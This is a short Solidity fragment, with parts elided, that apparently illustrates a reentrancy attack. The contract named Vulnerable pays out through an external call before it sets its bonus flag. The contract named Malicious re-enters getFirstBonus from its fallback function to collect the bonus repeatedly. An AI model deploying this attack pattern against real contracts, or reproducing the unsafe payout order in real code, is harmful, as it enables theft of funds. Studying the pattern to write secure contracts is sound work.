contract Vulnerable {
  ...
  function getFirstBonus(address rept) {
    require(!Bonus[rept]);
    Reward[rept] += 100;
    withdraw(rept);
    Bonus[rept] = true;
  }
  function withdraw(address rept) {
    uint amount = Reward[rept];
    Reward[rept] = 0;
    rept.call.value(amount)();
  }
}

contract Malicious{
  ...
  function Malicious(){
    vul = Vulnerable(_vulAddr);
  }
  
  function attack(){
    vul.getFirstBonus(_owner);
  }
  
  function ()payable{
    count++;
    if (count < 10){
      vul.getFirstBonus(_owner);
    }
  }
}
